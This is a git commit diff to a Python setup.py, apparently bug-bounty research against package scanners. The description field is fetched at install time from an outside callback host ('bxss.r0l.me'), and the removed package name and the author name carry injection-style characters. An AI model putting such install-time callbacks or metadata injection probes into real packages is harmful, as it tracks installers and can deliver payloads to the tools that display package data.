b33c0121d104a357e2c995e2ab0fce5dc04a11ed
Rreiss'"sHackerOne/s <72650266+rreissdorker@users.noreply.github.com>
2024-06-30 23:25:11 +0300

    Update setup.py

--- setup.py
+++ setup.py
@@ -3,9 +3,9 @@ from setuptools import setup
 import requests
 
 setup(
-    name='sp<s>dd',
-    version='2.0.2',
-    description=requests.get("https://bxss.r0l.me/snykdesc"),
+    name='myghpackage',
+    version='1.0.0',
+    description=requests.get("https://bxss.r0l.me/myghpackage-snykdesc"),
     long_description='Some random long description',
     long_description_content_type='text/markdown',
     author='Rotem Reiss',
